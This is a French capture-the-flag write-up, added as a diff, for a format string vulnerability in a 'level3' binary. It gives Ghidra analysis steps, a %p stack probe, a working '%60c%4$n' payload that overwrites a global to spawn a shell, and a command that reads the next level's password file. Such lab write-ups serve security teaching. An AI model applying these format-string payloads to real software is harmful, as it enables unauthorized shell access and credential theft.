@@ -1,0 +1,53 @@
+# Level 3 - Format String Vulnerability
+
+## Vulnerability
+`printf(input)` au lieu de `printf("%s", input)` — l'utilisateur contrôle le format string.
+Le but est d'écrire 64 (0x40) dans la variable globale `m` pour déclencher `system("/bin/sh")`.
+
+## Analyse avec Ghidra
+
+1. Ouvrir le binaire `level3` dans Ghidra
+2. Aller dans la fonction `v`
+3. Cliquer sur la variable `m` dans le code décompilé
+4. Dans la vue mémoire, noter son adresse : `0x0804988c`
+5. Le code vulnérable :
+```c
+fgets(local_20c, 0x200, stdin);
+printf(local_20c);          // ← format string vulnerability
+if (m == 0x40) {            // 0x40 = 64
+    system("/bin/sh");
+}
+```
+
+## Trouver la position du buffer sur la stack
+
+```bash
+python -c 'print "AAAA %p %p %p %p %p %p %p %p %p %p"' | ./level3
+```
+
+Dans la sortie, chercher `0x41414141` (= AAAA en hex).
+Compter sa position → ici c'est la **4ème**.
+
+## Construire le payload
+
+```
+[adresse de m en little-endian] [%60c] [%4$n]
+```
+
+- `\x8c\x98\x04\x08` → adresse de m (4 octets déjà comptés)
+- `%60c` → affiche 60 caractères (4 + 60 = 64 = 0x40)
+- `%4$n` → écrit 64 à l'adresse du 4ème argument (notre adresse)
+
+## Exploit
+
+```bash
+(python -c 'print "\x8c\x98\x04\x08%60c%4$n"'; cat) | ./level3
+```
+
+Le `cat` garde le shell ouvert après le `system("/bin/sh")`.
+
+## Récupérer le flag
+
+```bash
+/bin/cat /home/user/level4/.pass
+```
